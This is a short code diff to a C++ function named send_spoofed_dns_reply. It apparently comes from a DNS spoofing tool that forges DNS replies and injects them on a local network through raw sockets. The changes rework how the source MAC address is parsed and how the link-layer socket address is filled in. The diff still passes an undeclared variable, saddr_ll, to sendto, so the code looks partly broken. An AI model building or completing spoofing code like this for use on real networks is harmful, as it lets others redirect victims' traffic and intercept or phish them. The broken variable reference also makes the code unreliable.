@@ -481,7 +481,13 @@ void send_spoofed_dns_reply(char *packet)
     // attach eth header before packet
 
     struct ether_header *eth_header = (struct ether_header *)malloc(ETHER_HEADER_LEN);
-    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
+    
+    unsigned char source_mac_char[6];
+    sscanf(source_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &source_mac_char[0], &source_mac_char[1], &source_mac_char[2],
+           &source_mac_char[3], &source_mac_char[4], &source_mac_char[5]);
+
+    memcpy(eth_header->ether_shost, source_mac_char, ETH_ALEN);
     // get the destination MAC address
     string dst_ip = inet_ntoa(*(in_addr *)&ip_header->daddr);
     string dst_mac = devices[dst_ip];
@@ -505,17 +511,13 @@ void send_spoofed_dns_reply(char *packet)
     struct sockaddr_ll socket_address;
     memset(&socket_address, 0, sizeof(socket_address));
     socket_address.sll_ifindex = ifindex;
-    socket_address.sll_halen = MAC_LENGTH;
+    socket_address.sll_halen = 6;
     socket_address.sll_protocol = htons(ETH_P_IP);
     socket_address.sll_family = AF_PACKET;
     socket_address.sll_pkttype = PACKET_BROADCAST;
     socket_address.sll_hatype = htons(ARPHRD_ETHER);
-    unsigned char source_mac_char[6];
-    sscanf(source_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &source_mac_char[0], &source_mac_char[1], &source_mac_char[2],
-           &source_mac_char[3], &source_mac_char[4], &source_mac_char[5]);
     
-    memcpy(saddr_ll.sll_addr, source_mac_char, MAC_LEN);
+    memcpy(socket_address.sll_addr, source_mac_char, 6);
     sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
 
     close(sock_raw_fd);
